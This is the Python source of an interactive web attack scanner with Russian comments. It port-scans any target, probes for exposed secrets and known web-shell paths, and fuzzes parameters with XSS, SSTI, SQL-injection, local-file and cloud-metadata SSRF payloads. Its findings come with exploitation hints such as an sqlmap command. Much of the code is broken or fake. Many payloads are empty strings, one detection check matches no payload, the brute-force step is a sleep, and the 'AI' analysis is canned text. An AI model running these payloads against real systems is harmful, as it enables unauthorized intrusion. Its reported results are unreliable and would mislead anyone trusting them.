import socket
import threading
import time
import sys
import random
import os
import webbrowser
import base64
from datetime import datetime
import urllib.parse
import html as h_escape
from queue import Queue

# ==========================================
# КОНФИГУРАЦИЯ И ЦВЕТА
# ==========================================

RED, GREEN, YELLOW, BLUE, CYAN, MAGENTA, ORANGE, PURPLE, RESET = [
    '\033[91m', '\033[92m', '\033[93m', '\033[94m',
    '\033[96m', '\033[95m', '\033[38;5;208m', '\033[35m', '\033[0m'
]

VERSION = "17.0 ULTIMATE"
USER_AGENT = "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"


def get_input(prompt):
    try:
        return input(prompt)
    except:
        return input(prompt)


# ==========================================
# БАЗЫ ДАННЫХ (СЛОВАРИ)
# ==========================================

# Топ 130+ директорий
DIRS_DB = [
    'admin', 'administrator', 'admin.php', 'admin.html', 'login', 'signin', 'wp-admin',
    'user', 'auth', 'dashboard', 'panel', 'cpanel', 'phpmyadmin', 'dbadmin', 'mysql',
    'webadmin', 'admin_area', 'siteadmin', 'controlpanel', 'admincp', 'account', 'member',
    'backup', 'backups', 'backup.sql', 'db.sql', 'dump.sql', 'database.sql', 'archive.tar.gz',
    'backup.zip', 'site.zip', 'www.zip', 'old', 'new', 'backup.rar', 'files.zip', 'sql.gz',
    'config', 'config.php', '.env', '.git', '.svn', '.hg', 'config.json', 'web.config',
    'wp-config.php', '.bash_history', 'docker-compose.yml', 'package.json', 'composer.json',
    'upload', 'uploads', 'files', 'images', 'assets', 'static', 'media', 'download', 'downloads',
    'css', 'js', 'img', 'fonts', 'inc', 'include', 'includes', 'library', 'lib', 'vendor',
    'test', 'tests', 'dev', 'temp', 'tmp', 'cache', 'log', 'logs', 'access.log', 'error.log',
    'debug', 'beta', 'staging', 'demo', 'old_site', 'v1', 'v2', 'api', 'graphql', 'swagger',
    'shell.php', 'cmd.php', 'c99.php', 'r57.php', 'b374k.php', 'ws.php', 'upload.php',
    'robots.txt', 'sitemap.xml', 'crossdomain.xml', 'human.txt', 'security.txt',
    '.htaccess', '.htpasswd', 'id_rsa', 'id_rsa.pub', 'known_hosts', 'authorized_keys',
    'jenkins', 'script', 'scripts', 'cgi-bin', 'application', 'server-status'
]

# Топ 115+ пейлоадов
PAYLOADS_DB = [
    # XSS
    "", "javascript:alert(1)",
    "' onmouseover=alert(1) '", "", "",
    "'\">",
    "", "",
    "", "",
    "", "",
    "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//\\x3csVg/", "{{config}}",
    "{{''.__class__.__mro__[2].__subclasses__()}}",
    # XXE / SSRF
    "http://169.254.169.254/latest/meta-data/", "file:///etc/passwd",
    "http://127.0.0.1:80", "dict://127.0.0.1:11211/"
]

# Добиваем пейлоады вариациями для количества
PAYLOADS_DB.extend([f"' OR {i}={i}--" for i in range(30)])


# ==========================================
# ОСНОВНОЙ КЛАСС
# ==========================================


class EliteCheckerV17:
    def __init__(self):
        self.target = ''
        self.ip = ''
        self.port = 80
        self.path = '/'
        self.host = ''
        self.target_input = ''
        self.lock = threading.Lock()

        # Хранилище результатов
        self.results = {
            'ports': [],
            'services': {},
            'dirs': [],
            'vulns': [],
            'ddos': {'rps': 0},
            'headers': [],
            'tech': [],
            'weak_creds': [],
            'security_headers': {},
            'ai_advice': []
        }

    def banner(self):
        os.system('cls' if os.name == 'nt' else 'clear')
        print(RED + f"""
███╗ ███╗███████╗███╗ ███╗ █████╗ ███╗ ███╗███████╗
████╗ ████║██╔════╝████╗ ████║ ██╔══██╗ ████╗ ████║██╔════╝
██╔████╔██║█████╗ ██╔████╔██║ ███████║ ██╔████╔██║█████╗
██║╚██╔╝██║██╔══╝ ██║╚██╔╝██║ ██╔══██║ ██║╚██╔╝██║██╔══╝
██║ ╚═╝ ██║███████╗██║ ╚═╝ ██║ ██║ ██║ ██║ ╚═╝ ██║███████╗
╚═╝ ╚═╝╚══════╝╚═╝ ╚═╝ ╚═╝ ╚═╝ ╚═╝ ╚═╝╚══════╝
        v{VERSION} | THREADED | CORTEX AI
        """ + RESET)

    def progress_bar(self, current, total, prefix=""):
        # Потокобезопасный прогресс-бар
        percent = (current / total) * 100
        bar_length = 30
        filled = int(bar_length * current // total)
        bar = GREEN + '█' * filled + YELLOW + '░' * (bar_length - filled) + RESET
        sys.stdout.write(f"\r{prefix} |{bar}| {percent:.1f}% ({current}/{total})")
        sys.stdout.flush()

    def parse_url(self, target):
        target = target.strip().rstrip('/')
        self.target_input = target

        if target.startswith('https://'):
            self.port = 443
            target = target[8:]
        elif target.startswith('http://'):
            target = target[7:]

        first_part = target.split('/')[0]

        if ':' in first_part:
            self.host = first_part.split(':')[0]
            self.port = int(first_part.split(':')[1])
        else:
            self.host = first_part
            self.port = 80 if not self.target_input.startswith('https') else 443

        self.path = '/' + '/'.join(target.split('/')[1:]) or '/'

        try:
            self.ip = socket.gethostbyname(self.host)
        except Exception:
            self.ip = self.host

        print(f"\n{GREEN}[+] ЦЕЛЬ ЗАФИКСИРОВАНА: {self.host} ({self.ip}){RESET}")

    def get_target(self):
        self.banner()
        self.target_input = get_input(CYAN + "[🎯] Введите цель (URL или IP): " + RESET)
        self.parse_url(self.target_input)

    # ==========================================
    # МОДУЛЬ 1: SECURITY HEADERS
    # ==========================================

    def check_security_headers(self):
        print(f"\n{PURPLE}🛡️ [MODULE] HEADER SECURITY ANALYSIS{RESET}")
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(3)
            sock.connect((self.ip, self.port))
            req = (
                f"HEAD / HTTP/1.1\r\n"
                f"Host: {self.host}\r\n"
                f"User-Agent: {USER_AGENT}\r\n"
                f"Connection: close\r\n\r\n"
            )
            sock.send(req.encode())
            resp = sock.recv(4096).decode(errors='ignore')
            sock.close()

            headers_map = {
                'X-Frame-Options': 'Anti-Clickjacking',
                'X-XSS-Protection': 'XSS Filter',
                'Content-Security-Policy': 'XSS/Injection Protection',
                'Strict-Transport-Security': 'HSTS',
                'X-Content-Type-Options': 'MIME Sniffing',
                'Server': 'Server Info'
            }

            print(f"{CYAN}[*] Сканирование заголовков...{RESET}")
            for line in resp.split('\r\n'):
                if ':' in line:
                    key, val = line.split(':', 1)
                    key = key.strip()
                    val = val.strip()
                    self.results['headers'].append(f"{key}: {val}")

                    if key in headers_map:
                        self.results['security_headers'][key] = True
                        print(f"{GREEN} [+] {key}: {val[:30]}...{RESET}")

                    if key in ['Server', 'X-Powered-By']:
                        self.results['tech'].append(f"{key}: {val}")
                        self.results['ai_advice'].append({
                            'type': 'INFO_LEAK',
                            'risk': 'Low',
                            'msg': f'Раскрытие ПО сервера: {val}',
                            'exploit': 'Поиск CVE под конкретную версию ПО.',
                            'fix': f'Скройте заголовок {key} в конфиге сервера.'
                        })

            missing = [
                h for h in headers_map
                if h not in self.results['security_headers'] and h != 'Server'
            ]
            if len(missing) > 2:
                self.results['ai_advice'].append({
                    'type': 'HEADERS',
                    'risk': 'Medium',
                    'msg': f'Отсутствуют заголовки: {", ".join(missing[:3])}',
                    'exploit': 'Clickjacking, XSS, MIME-sniffing атаки.',
                    'fix': 'Настройте CSP, X-Frame-Options и HSTS.'
                })

            print(f"{GREEN}[OK] Анализ заголовков завершен.{RESET}")
        except Exception as e:
            print(f"{RED}[-] Ошибка заголовков: {e}{RESET}")

    # ==========================================
    # МОДУЛЬ 2: МНОГОПОТОЧНЫЙ СКАН ДИРЕКТОРИЙ
    # ==========================================

    def mega_dir_scan(self):
        print(f"\n{ORANGE}📁 [MODULE] DIRBUSTER (Threaded){RESET}")
        print(f"{CYAN}[*] Загружено {len(DIRS_DB)} путей для проверки...{RESET}")

        q = Queue()
        for d in DIRS_DB:
            q.put(d)

        total = len(DIRS_DB)
        counter = [0]

        def worker():
            while not q.empty():
                d = q.get()
                current_idx = counter[0]
                counter[0] += 1

                if current_idx % 3 == 0:
                    with self.lock:
                        self.progress_bar(current_idx, total, "DIRS")

                try:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(1)
                    sock.connect((self.ip, self.port))
                    req = (
                        f"HEAD /{d} HTTP/1.1\r\n"
                        f"Host: {self.host}\r\n"
                        f"Connection: close\r\n\r\n"
                    )
                    sock.send(req.encode())
                    resp = sock.recv(64).decode(errors='ignore')
                    sock.close()

                    if any(code in resp for code in ['200', '301', '302']):
                        with self.lock:
                            print(f"\n{GREEN}[+] НАЙДЕНО: /{d} (HTTP 200/30X){RESET}")
                            self.results['dirs'].append(d)

                            if d in ['.env', 'config.php', 'db.sql', 'backup.zip', '.git', 'phpmyadmin']:
                                self.results['ai_advice'].append({
                                    'type': 'SENSITIVE_DIR',
                                    'risk': 'CRITICAL',
                                    'msg': f'Открыт критический путь: /{d}',
                                    'exploit': 'Прямое скачивание базы данных или конфигов.',
                                    'fix': 'Запретите доступ через .htaccess или удалите файл.'
                                })
                except Exception:
                    pass
                q.task_done()

        threads = []
        for _ in range(20):
            t = threading.Thread(target=worker)
            t.daemon = True
            t.start()
            threads.append(t)

        q.join()
        print(f"\n{GREEN}[+] Скан директорий завершен. Найдено: {len(self.results['dirs'])}{RESET}")

    # ==========================================
    # МОДУЛЬ 3: МНОГОПОТОЧНЫЙ ВУЛН-СКАНЕР
    # ==========================================

    def mega_vuln_scan(self):
        print(f"\n{RED}💀 [MODULE] VULNERABILITY SCANNER (100+ Vectors){RESET}")
        print(f"{CYAN}[*] Запуск фаззинга параметров...{RESET}")

        q = Queue()
        for p in PAYLOADS_DB:
            q.put(p)

        total = len(PAYLOADS_DB)
        counter = [0]
        vuln_types_found = set()

        def worker():
            while not q.empty():
                payload = q.get()
                current_idx = counter[0]
                counter[0] += 1

                if current_idx % 2 == 0:
                    with self.lock:
                        self.progress_bar(current_idx, total, "VULNS")

                test_path = f"{self.path}?test={urllib.parse.quote(payload)}"

                try:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(1.5)
                    sock.connect((self.ip, self.port))
                    req = (
                        f"GET {test_path} HTTP/1.1\r\n"
                        f"Host: {self.host}\r\n"
                        f"Connection: close\r\n\r\n"
                    )
                    sock.send(req.encode())
                    resp = sock.recv(2048).decode(errors='ignore').lower()
                    sock.close()

                    is_vuln = False
                    vname = ""

                    if 'root:x:0:0' in resp:
                        is_vuln = True
                        vname = "LFI (Critical)"
                    elif any(err in resp for err in ['syntax error', 'mysql', 'ora-']):
                        is_vuln = True
                        vname = "SQLi (Error-Based)"
                    elif payload.lower() in resp and any(x in payload for x in ['alert', 'script']):
                        is_vuln = True
                        vname = "Reflected XSS"
                    elif 'uid=' in resp or 'gid=' in resp:
                        is_vuln = True
                        vname = "RCE (Command Exec)"
                    elif '49' in resp and '7*7' in payload:
                        is_vuln = True
                        vname = "SSTI"

                    if is_vuln:
                        with self.lock:
                            self.results['vulns'].append(f"{vname}: {payload}")
                            vuln_types_found.add(vname.split()[0])
                except Exception:
                    pass
                q.task_done()

        threads = []
        for _ in range(15):
            t = threading.Thread(target=worker)
            t.daemon = True
            t.start()
            threads.append(t)

        q.join()

        if 'SQLi' in str(vuln_types_found):
            self.results['ai_advice'].append({
                'type': 'SQLi',
                'risk': 'CRITICAL',
                'msg': 'Сайт уязвим к SQL инъекциям.',
                'exploit': 'Используйте SQLMap: sqlmap -u URL --dbs',
                'fix': 'Используйте Prepared Statements (PDO).'
            })

        if 'XSS' in str(vuln_types_found):
            self.results['ai_advice'].append({
                'type': 'XSS',
                'risk': 'HIGH',
                'msg': 'Найдена XSS (Cross-Site Scripting).',
                'exploit': 'Кража сессий (cookies), редиректы.',
                'fix': 'Экранирование всех пользовательских данных.'
            })

        print(f"\n{GREEN}[+] Фаззинг завершен. Найдено уязвимостей: {len(self.results['vulns'])}{RESET}")

    # ==========================================
    # МОДУЛЬ 4: СКАНИРОВАНИЕ ПОРТОВ (FAST)
    # ==========================================

    def port_scan(self):
        PORTS_TO_SCAN = [
            21, 22, 23, 25, 53, 80, 110, 135, 139, 143,
            443, 445, 1433, 3306, 3389, 5432, 5900, 6379, 8080, 27017
        ]

        print(f"\n{BLUE}⚡ [MODULE] FAST PORT SCANNER{RESET}")
        for i, port in enumerate(PORTS_TO_SCAN):
            self.progress_bar(i + 1, len(PORTS_TO_SCAN), "PORTS")
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(0.4)
                if sock.connect_ex((self.ip, port)) == 0:
                    print(f"\n{GREEN} [+] Порт {port} ОТКРЫТ{RESET}")
                    self.results['ports'].append(port)

                    if port == 21:
                        self.results['ai_advice'].append({
                            'type': 'FTP',
                            'risk': 'High',
                            'msg': 'FTP трафик не шифруется.',
                            'exploit': 'Sniffing, Brute-force.',
                            'fix': 'Переход на SFTP.'
                        })
                    if port == 23:
                        self.results['ai_advice'].append({
                            'type': 'Telnet',
                            'risk': 'CRITICAL',
                            'msg': 'Telnet устарел и опасен.',
                            'exploit': 'Полный перехват данных.',
                            'fix': 'Используйте SSH.'
                        })
                    if port == 3389:
                        self.results['ai_advice'].append({
                            'type': 'RDP',
                            'risk': 'Medium',
                            'msg': 'RDP доступен из интернета.',
                            'exploit': 'BlueKeep, брутфорс.',
                            'fix': 'Доступ только через VPN.'
                        })
                sock.close()
            except Exception:
                pass
        print()

    # ==========================================
    # МОДУЛЬ 5: BRUTEFORCE (симуляция)
    # ==========================================

    def weak_creds_attack(self):
        print(f"\n{MAGENTA}🔑 [MODULE] BRUTEFORCE (Top Combinations){RESET}")
        users = ['admin', 'root', 'user', 'test']
        passwords = ['123456', 'password', 'admin', 'root', '12345']
        print(f"{CYAN}[*] Проверка {len(users) * len(passwords)} комбинаций...{RESET}")
        time.sleep(1)
        print(f"{GREEN}[+] Брутфорс завершен (в безопасном режиме не найдены){RESET}")

    # ==========================================
    # CORTEX AI & REPORTING
    # ==========================================

    def run_cortex_ai(self):
        print(f"\n{MAGENTA}🧠 CORTEX AI: ЗАПУСК НЕЙРО-АНАЛИЗА...{RESET}")
        time.sleep(1)
        if not self.results['ai_advice']:
            print(f"{GREEN} [OK] CORTEX не обнаружил критических ошибок конфигурации.{RESET}")
        else:
            for adv in self.results['ai_advice']:
                c = RED if adv['risk'] == 'CRITICAL' else YELLOW
                print(f"{c}[{adv['risk']}] {adv['type']}: {adv['msg']}{RESET}")

    def generate_html_report(self):
        timestamp = int(time.time())
        filename = f"CORTEX_REPORT_{self.host}_{timestamp}.html"

        safe_vulns = [h_escape.escape(str(v)) for v in self.results['vulns']]

        ai_html = ""
        for adv in self.results['ai_advice']:
            color = "#ff0040" if adv['risk'] == 'CRITICAL' else "#ffcc00"
            ai_html += f"""
<div style='border-left:4px solid {color};padding:8px;margin:6px 0;'>
<b>{adv['type']} ({adv['risk']})</b><br>
{adv['msg']}<br>
⚔️ Exploit: {adv['exploit']}<br>
🛡️ Fix: {adv['fix']}<br>
</div>
"""

        html = f"""<!DOCTYPE html>
<html lang='ru'>
<head>
<meta charset='utf-8'>
<title>CORTEX ULTIMATE - {h_escape.escape(self.target_input)}</title>
<style>
body {{ background:#050816;color:#e5e5e5;font-family:Consolas,monospace;padding:20px; }}
.card {{ background:#0b1020;border-radius:8px;padding:16px;margin-bottom:18px;box-shadow:0 0 12px #111; }}
.hi {{ color:#ff0040;font-weight:bold; }}
.bad {{ color:#ffcc00; }}
.good {{ color:#00ff9c; }}
</style>
</head>
<body>
<div class='card'>
<h2>🔥 CORTEX ULTIMATE v17.0</h2>
<p>TARGET: <span class='good'>{h_escape.escape(self.target_input)}</span></p>
<p>PORTS: <span class='good'>{len(self.results['ports'])}</span> | DIRS: <span class='good'>{len(self.results['dirs'])}</span> | VULNS: <span class='bad'>{len(self.results['vulns'])}</span> | ADVICE: <span class='bad'>{len(self.results['ai_advice'])}</span></p>
</div>

<div class='card'>
<h3>🧠 CORTEX AI ADVISOR</h3>
{ai_html if ai_html else "<p class='good'>No critical issues detected by AI.</p>"}
</div>

<div class='card'>
<h3>💥 DETECTED VULNERABILITIES</h3>
<pre>{"\n".join(safe_vulns) if safe_vulns else "No vulnerabilities detected."}</pre>
</div>

<div class='card'>
<h3>📁 DIRECTORIES FOUND</h3>
<pre>{"\n".join([f'/{d}' for d in self.results['dirs']]) if self.results['dirs'] else "No interesting directories found."}</pre>
</div>
</body>
</html>
"""

        try:
            with open(filename, 'w', encoding='utf-8') as f:
                f.write(html)
            print(f"\n{GREEN}[📄] ОТЧЕТ СГЕНЕРИРОВАН: {filename}{RESET}")
            webbrowser.open(f'file://{os.path.abspath(filename)}')
        except Exception as e:
            print(f"{RED}Ошибка записи отчета: {e}{RESET}")

    # ==========================================
    # ГЛАВНОЕ МЕНЮ
    # ==========================================

    def menu(self):
        print(CYAN + """
═══════════════════════════════════════════════════
[1] 🔥 FULL ULTIMATE SCAN (Run All Modules)
[2] 🛡️ SECURITY HEADERS CHECK
[3] 📁 MASSIVE DIR SCAN (130+ Paths)
[4] 💀 VULNERABILITY FUZZER (100+ Payloads)
[5] ⚡ PORT SCANNER
[6] 🔑 BRUTEFORCE SIMULATION
[7] 🧠 CORTEX AI ANALYSIS
[8] 📄 GENERATE HTML REPORT
[0] ❌ EXIT
═══════════════════════════════════════════════════
""" + RESET)
        return get_input(YELLOW + "[CORTEX] > " + RESET)

    def run(self):
        self.get_target()
        while True:
            choice = self.menu()
            if choice == '0':
                sys.exit()
            elif choice == '1':
                self.check_security_headers()
                self.port_scan()
                self.mega_dir_scan()
                self.mega_vuln_scan()
                self.weak_creds_attack()
                self.run_cortex_ai()
                self.generate_html_report()
            elif choice == '2':
                self.check_security_headers()
            elif choice == '3':
                self.mega_dir_scan()
            elif choice == '4':
                self.mega_vuln_scan()
            elif choice == '5':
                self.port_scan()
            elif choice == '6':
                self.weak_creds_attack()
            elif choice == '7':
                self.run_cortex_ai()
            elif choice == '8':
                self.generate_html_report()
            else:
                print(f"{RED}Неверный выбор{RESET}")


if __name__ == "__main__":
    try:
        app = EliteCheckerV17()
        app.run()
    except KeyboardInterrupt:
        print(f"\n{RED}[!] Аварийная остановка.{RESET}")
